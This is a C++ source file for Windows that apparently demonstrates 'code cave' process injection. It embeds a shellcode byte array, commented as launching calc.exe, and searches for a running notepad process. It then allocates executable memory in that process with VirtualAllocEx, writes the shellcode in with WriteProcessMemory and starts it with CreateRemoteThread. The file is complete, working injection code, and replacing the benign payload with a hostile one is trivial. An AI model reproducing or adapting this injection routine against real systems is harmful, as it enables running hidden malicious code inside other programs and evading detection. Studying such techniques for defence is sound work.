

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>


using namespace std;

//Standard calc.exe shellcode
char shellcode[] = "\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7";


HANDLE FindRunningProcess(LPSTR processName) {
	/*
	Standard find process by name and return the process handle
	*/

	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	//Create initial snapshot
	pe32.dwSize = sizeof(PROCESSENTRY32);
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		//Invalid handle was returned, snapshot failed, bail
#ifdef _DEBUG
		cout << "Failed to create snapshot" << endl;
#endif 
		return INVALID_HANDLE_VALUE;
	}

	if (!Process32First(hProcessSnap, &pe32)) {
		//Unable to actually access the first process, bail
#ifdef _DEBUG
		cout << "Failed to get first process" << endl;
#endif 

		CloseHandle(hProcessSnap);
		return INVALID_HANDLE_VALUE;

	}
	//Enumerate through all processes and check the name
	do {

#ifdef _DEBUG
		cout << "Process Id:" << pe32.th32ProcessID << endl;
#endif 
		//Print Parent id, setup constants
		cout << "Parent Id:" << pe32.th32ParentProcessID << endl;
		LPSTR buffer = new CHAR[MAX_PATH];
		DWORD value = MAX_PATH;

		//Open the process handle
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

		//Query the Name and save to buffer
		QueryFullProcessImageNameA(hProcess, 0, buffer, &value);
		cout << buffer << endl;

		//Check if the process name is the one we're looking for
		if (strstr(buffer, processName)) {
#ifdef _DEBUG
			cout << "Found a notepad" << endl;
#endif
			//Found the process, return the process handle
			return hProcess;
		}
		cout << endl;

	} while (Process32Next(hProcessSnap, &pe32)); //Continue

	//Failed to find the process, returning
	return INVALID_HANDLE_VALUE;
}


int main()
{
	/*
	Code Cave Injection
	*/
	cout << "Test!\n";
	char processName[] = "notepad";
	HANDLE p = FindRunningProcess(processName);
	if (p == INVALID_HANDLE_VALUE) {
		//FindRunningProcess failed
		cout << "Failed to find notepad" << endl;
	}
	else {
		//Success
		cout << "Found notepad!" << endl;
	}
	char  mytext[] = "Hello by CodeCave!";
	char mycaption[] = "Injection result";

	//Allocate memory in the remote process, and then start the thread
	LPVOID MyFuncAddress = VirtualAllocEx(p, NULL, 258, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(p, MyFuncAddress, (void*)shellcode, 258, NULL);
	HANDLE thread = CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)MyFuncAddress, 0, 0, NULL);

	if (thread != 0) {
		//Waiting until thread has started
		WaitForSingleObject(thread, INFINITE);   //this waits untill thread thread has finished
		CloseHandle(thread);
		CloseHandle(p);  //don't wait for the thread to finish, just close the handle to the process
		cout << "Injection completed!" << endl;
	}
	else {
		cout << "Error!" << endl;
	}

	//Wait
	system("PAUSE");
	return EXIT_SUCCESS;


}




